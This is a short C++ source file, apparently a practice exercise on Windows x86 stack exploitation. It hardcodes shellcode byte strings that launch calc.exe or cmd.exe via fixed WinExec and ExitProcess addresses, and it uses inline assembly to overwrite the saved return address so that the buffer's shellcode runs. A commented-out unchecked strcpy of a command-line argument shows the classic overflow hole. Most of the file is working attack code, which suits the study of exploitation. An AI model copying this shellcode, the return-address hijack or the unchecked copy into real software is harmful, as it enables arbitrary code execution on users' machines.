// vulnerable.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include<cstdlib>
#include<iostream>

using namespace std;

/*int _tmain(int argc, _TCHAR* argv[])
{
	return 0;
}*/

int get_ebp()
{
	__asm mov eax, [ebp]
}

int main(int argc, char *argv[])
{
	int ebp;
	//char buffer[328];
	ebp = get_ebp();
	
	cout << "Before strcpy..." << endl << endl;

	//strcpy(buffer, argv[1]);
	// CMD.exe w/ NOPs
	//char buffer[] = "\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x16\x5b\x31\xc0\x50\x53\xbb\x0d\x25\x86\x7c\xff\xd3\x31\xc0\x50\xbb\x12\xcb\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63\x6d\x64\x2e\x65\x78\x65\x00\x90\x90\x90\x90\x90\x90";
	// CMD.exe w/o NOPs
	//char buffer[] = "\xeb\x16\x5b\x31\xc0\x50\x53\xbb\x0d\x25\x86\x7c\xff\xd3\x31\xc0\x50\xbb\x12\xcb\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63\x6d\x64\x2e\x65\x78\x65\x00";
	// Calc.exe w/ NOPs
	//char buffer[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x81\xc4\x11\xff\xff\xff\x81\xec\x69\xff\xff\xff\xeb\x16\x5b\x31\xc0\x50\x53\xbb\x0d\x25\x86\x7c\xff\xd3\x31\xc0\x50\xbb\x12\xcb\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63\x61\x6c\x63\x2e\x65\x78\x65\x00\x90\x90\x90\x90\x90\x90";
	// Calc.exe w/o NOPs
	char buffer[] = "\x81\xc4\x11\xff\xff\xff\x81\xec\x69\xff\xff\xff\xeb\x16\x5b\x31\xc0\x50\x53\xbb\x0d\x25\x86\x7c\xff\xd3\x31\xc0\x50\xbb\x12\xcb\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	*((int *) (ebp + 4)) = (int) &buffer;

	//cout << "BuffAddr: " << hex << &buffer << endl;
	//cout << "EBPAddr: " << hex << &ebp << endl;
	//cout << "EBPSize: " << sizeof(ebp) << endl;
	//ebp = get_ebp();
	//cout << "EBP: " << hex << ebp << endl;

	cout << hex << (int) &buffer << endl;

	cout << "After strcopy..." << endl;
	
	return 0;
}

